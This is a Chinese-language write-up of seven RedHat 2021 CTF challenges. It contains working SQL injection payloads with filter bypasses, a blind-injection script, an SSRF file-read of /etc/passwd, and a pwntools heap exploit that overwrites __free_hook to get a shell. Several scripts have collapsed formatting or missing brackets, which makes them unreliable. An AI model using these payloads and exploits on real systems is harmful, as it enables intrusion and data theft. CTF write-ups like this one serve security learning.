## 第一题：签到题

 **解题过程：  
** 下载附件是一个 .txt 文件 EBCDIC.txt，从名称可以看出是 EBCDIC 编码，通过 010editor 将文件转成十六进制编码  
![1632819877_6152daa54565f5e170d1e.png!small](https://image.3001.net/images/20210928/1632819877_6152daa54565f5e170d1e.png!small)使用在线
EBCDIC 解码网站，得到 flag

![1632819891_6152dab3b1aefbb05d409.png!small](https://image.3001.net/images/20210928/1632819891_6152dab3b1aefbb05d409.png!small)
**得到flag值：** flag{we1c0me_t0_redhat2021}

## 第二题：find_it

 **解题过程：**  
访问首页如下

![1632819911_6152dac70ddff33330755.png!small](https://image.3001.net/images/20210928/1632819911_6152dac70ddff33330755.png!small)  
查看 robots.txt 发现有东西：1ndexx.php

![1632819930_6152dada8919c1e864318.png!small](https://image.3001.net/images/20210928/1632819930_6152dada8919c1e864318.png!small)

访问1ndex.php发现错误 "HTTP ERROR
500"![1632819958_6152daf66d27bf80b34f8.png!small](https://image.3001.net/images/20210928/1632819958_6152daf66d27bf80b34f8.png!small)

思路断了，没什么新发现，于是考虑有没有其他信息泄露地方，发现 1ndexx.php 有备份文件：.1ndexx.php.swp

![1632819981_6152db0d28971105e6a7e.png!small](https://image.3001.net/images/20210928/1632819981_6152db0d28971105e6a7e.png!small)阅读代码发现有写文件的功能，通过
code 参数写文件到 hack.php，不过实际功能是在 index.php 文件中，code 过滤了很多关键字，考虑收集更多信息时先执行 phpinfo
后面发现 phpinfo 页面中存在 flag值

![1632819995_6152db1b40edafde1b286.png!small](https://image.3001.net/images/20210928/1632819995_6152db1b40edafde1b286.png!small)

![1632820009_6152db29e6a849622f9b4.png!small](https://image.3001.net/images/20210928/1632820009_6152db29e6a849622f9b4.png!small)

 **得到flag值：** flag{1755b232-d80c-4b9d-880b-e65442bcb35d}

## 第三题：WebsiteManger

 **解题过程** **：  
** 访问首页使用 burp 抓包发现存在 image.php 页面，尝试 sql 注入漏洞，发现漏洞存在  
![1632820034_6152db429528049b8deed.png!small](https://image.3001.net/images/20210928/1632820034_6152db429528049b8deed.png!small)![1632820056_6152db589d1ab385baf69.png!small](https://image.3001.net/images/20210928/1632820056_6152db589d1ab385baf69.png!small)

题目过滤了空格，可以用/**/绕过，过滤了limit，可以通过 where控制输出的行，通过如下参数得知除了mysql、performance_schema
、information_schema 仅剩1个数据

![1632820073_6152db694a1d525d65074.png!small](https://image.3001.net/images/20210928/1632820073_6152db694a1d525d65074.png!small)

sql注入语句

    
    
    id=1/**/%26%26/**/(select/**/count(*)/**/from/**/(select/**/distinct/**/table_schema/**/from/**/information_schema.columns/**/where/**/table_schema!='information_schema'/**/%26%26table_schema!='performance_schema'%26%26table_schema!='mysql')a)%3d1

  
盲注后数据库名，基础注入语句

    
    
    id=1/**/%26%26/**/(ascii(substr((select/**/table_schema/**/from/**/(select/**/distinct/**/table_schema/**/from/**/information_schema.columns/**/where/**/table_schema!='information_schema'/**/%26%26table_schema!='performance _schema'%26%26table_schema!='mysql')a),1,1)))<=180

![1632820094_6152db7e2efd3c742f0d2.png!small](https://image.3001.net/images/20210928/1632820094_6152db7e2efd3c742f0d2.png!small)

通过修改 substr 的偏移和右侧的 ascii 码值即可获取数据库名，最终可得数据库名为 ctf，通过类似手段发现 ctf 库存在表 users，字段为
username 和 password，字段可通过 like 语句爆破首字母，通过首字母确定唯一行，如下参数：

    
    
    id=1/**/%26%26/**/(ascii(substr((select/**/column_name/**/from/**/(select/**/distinct/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='ctf'%26%26table_name='users'%26%26column_name/**/like/**/'u%25')a),1,1)))<=255

![1632820114_6152db9202ad9ecb26f64.png!small](https://image.3001.net/images/20210928/1632820114_6152db9202ad9ecb26f64.png!small)![1632820129_6152dba1088c26846343e.png!small](https://image.3001.net/images/20210928/1632820129_6152dba1088c26846343e.png!small)Like
'u%'就正确返回，like 'x%'就返回空，证明有字段为 u 打头通过类似手段发现 users
表仅有一行数据，注入得到用户名和密码：admin/578bcebef40e5500dfbf6

![1632820147_6152dbb3393d6e2e2ee8d.png!small](https://image.3001.net/images/20210928/1632820147_6152dbb3393d6e2e2ee8d.png!small)

用以上的用户登录网站：

![1632820160_6152dbc07d301bbb63ef1.png!small](https://image.3001.net/images/20210928/1632820160_6152dbc07d301bbb63ef1.png!small)

  
输入 http://127.0.0.1 和 http://127.0.0.1 后用burp拦截后发现请求对应的网页并返回网页内容：  
![1632820176_6152dbd06642631fcaf6e.png!small](https://image.3001.net/images/20210928/1632820176_6152dbd06642631fcaf6e.png!small)

host参数尝试 file 协议读取发现 etc/passwd 文件  
![1632820192_6152dbe04c7a5d15b5ac5.png!small](https://image.3001.net/images/20210928/1632820192_6152dbe04c7a5d15b5ac5.png!small)  
直接尝试读 /flag 成功获得 flag值  
![1632820207_6152dbef347753c8406b4.png!small](https://image.3001.net/images/20210928/1632820207_6152dbef347753c8406b4.png!small)核心盲注代码如下：  
  

    
    
    # -*- coding: utf-8 -*-import requestsimport threadpooldef look_up_a_char(num, bit):#查询第 num 行的第 bit 位字符start = 0end = 255mid = 0while(start<end):#二分查找mid = (start+end)/2te=check_login(num,bit,mid)if te=='yes':#逻辑真end = midelif te=='no':#逻辑假start = midelse:#程序出错print 'bug' breakif start == end-1:te=check_login(num,bit,mid)if te=='yes':#逻辑真breakelif te=='no':#逻辑假mid = endbreakelse:print 'bug'#程序出错breakreturn chr(mid)def check_login(num, bit, test_c):#比较第 num 行的第 bit 位字符与 test_c 字符的大小url ="http://eci-2zecrfutex8x4opco12z.cloudeci1.ichunqiu.com/image.php?id=1/**/%26%26/**/(ascii(substr((select/**/password/**/from/**/users),"+str(bit)+",1)))<="+str(test_c)r = requests.get(url)if len(r.content) > 0:result = 'yes' else:result = 'no' return resultdef look_up_line(num):#查询第 num 行数据并打印schema_name = ""for i in range(1,200):#遍历字段所有位b=look_up_a_char(num, i)if ord(b)==1:breakschema_name+=bprint bprint schema_nameif __name__ == '__main__':look_up_line(1)

 **得到flag值：** flag{8f4b80ec-17fc-414d-bf7c-0915db92d696}

## 第四题：Colorful Cod

 **解题过程：  
** 脚本把数据作为 RGB 像素转图片，然后使用在线 piet 解码

    
    
    from PIL import Imageres = []with open('data2','rb') as f:c = f.read()for i in range(len(c)//3):tmp = c[i*3:i*3+3]r,g,b = tmp[0],tmp[1],tmp[2]res.append((r,g,b))with open('data1', 'r') as f:c = f.read().split(' ')rr = []for i in c[:-1]:rr.append(res[int(i)])img = Image.new('RGB',(37,191),(255,255,255))for j in range(37):for i in range(191):img.putpixel((j,i),rr[i+j*191])img.save('1.png')

 **  
得到 flag值：** flag{88842f20-fb8c-45c9-ae8f-36135b6a0f11}

## 第五题：manager

 **解题过程：**

    
    
    from pwn import *def Insert(key, size, content):r.recvuntil("> ")r.sendline("1")r.recvuntil("> ")r.sendline(key)r.recvuntil("> ")r.sendline(str(size))r.recvuntil("> ")r.sendline(content)r = remote('47.105.94.48',12243)Insert("5", 0x60, 'aaaa')Insert("4", 0x420, 'bbbb')Insert("7", 0x60, "/bin/sh\x00")Insert("6", 0x60, 'cccc')Insert("8", 0x60, 'dddd')r.recvuntil("> ")r.sendline("2")r.recvuntil("> ")r.sendline("4")Insert("4", 0x420, "12345678")r.recvuntil("> ")r.sendline("3")r.recvuntil("12345678")libc_address = u64(r.recv(6) + b"\0\0") - 0x3afca0 - 0x3c000print("libc:" + hex(libc_address))free_hook = libc_address+4118760system_addr = libc_address+324832r.recvuntil("> ")r.sendline("2")r.recvuntil("> ")r.sendline("5")Insert("5", 0x60, p64(free_hook))Insert("11", 0x60, p64(system_addr))Insert("12", 0x60, p64(system_addr))r.recvuntil("> ")r.sendline("2")r.recvuntil("> ")r.sendline("7")r.interactive() **得到flag** **值：** flag{ebc2c10e345462db844bd1940aa692e4}

## 第六题：primegame

###  **解题过程：**

类似0-1背包，扩展到了32-128的背包，采用low density attack
攻击方式，攻击实现网上有多种，核心思想构造矩阵，结合LLL算法得到一组最小解  
![1632820236_6152dc0c6b413da23e4a7.png!small](https://image.3001.net/images/20210928/1632820236_6152dc0c6b413da23e4a7.png!small)

运算sagemath脚本，即可得到 flag

![1632820255_6152dc1fc09239015383b.png!small](https://image.3001.net/images/20210928/1632820255_6152dc1fc09239015383b.png!small)

 **得到flag值：** flag{715c39c3-1b46-4c23-8006-27b43eba2446}

## 第七题：primegame

 **解题过程** **：** 通过搜索代码中的关键字发现这是一道 hyper ctf 2020上的原题，分析题解后
https://ctftime.org/task/14387 借鉴https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup 的代码，稍微修改后得到 flag

    
    
    import itertoolsimport structp = 1000000000000000111R.<x> = GF(p)[]; y=xf = y + prod(map(eval, 'yyyyyyy'))C = HyperellipticCurve(f, 0)J = C.jacobian()Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)enc =bytes.fromhex('66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5')known_pt = b"a"*20 + b"flagrng_output = bytes(e^^m for e,m in zip(enc, known_pt)blocks = [rng_output[i:i+8] for i in range(0, len(rng_output), 8)]ui = [int.from_bytes(r, 'little') for r in blocks]u = x^3 + ui[2]*x^2 + ui[1]*x + ui[0L = GF(p).algebraic_closure()roots = [r[0] for r in u.change_ring(L).roots()]RR.<zz> = PolynomialRing(L)v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) for xi in roots])vi = [v.coefficients()[i].as_finite_field_element()[1] for i in range(3)]vi = [(int(-c), int(c)) for c in vi]for rs in itertools.product(*vi):q = struct.pack('<'+'Q'*len(rs), *rs)﻿flag = bytes(k^^m for k,m in zip(2*(rng_output+q), enc))print(flag)

 **得到flag值：** flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}

